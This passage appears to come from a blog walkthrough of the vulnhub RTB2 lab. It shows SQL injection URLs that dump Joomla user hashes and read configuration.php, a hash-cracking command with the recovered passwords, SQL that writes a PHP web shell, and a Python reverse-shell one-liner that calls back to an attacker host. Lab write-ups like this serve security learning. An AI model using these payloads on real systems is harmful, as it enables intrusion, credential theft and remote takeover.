<p><img src="/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>next, get column username and password:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>The format is hash:salt</p>

<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>

<pre><code>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt 
</code></pre>

<p>for administrator, I didn&rsquo;t get the password</p>

<p>for JSmith, password is matrix, for BTallor, password is victim.</p>

<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>find the username/password. Use it login phpmyadmin</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now I will create a backdoor using mysql:</p>

<pre><code>create database pwn;
create table backdoor(script text);
insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
select * into outfile "/var/www/backdoor3.php" from backdoor;
</code></pre>

<p>check the backdoor.</p>

<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>good.</p>

<p>Setup netcat and</p>

<pre><code>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p><code>uname -a</code></p>

<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
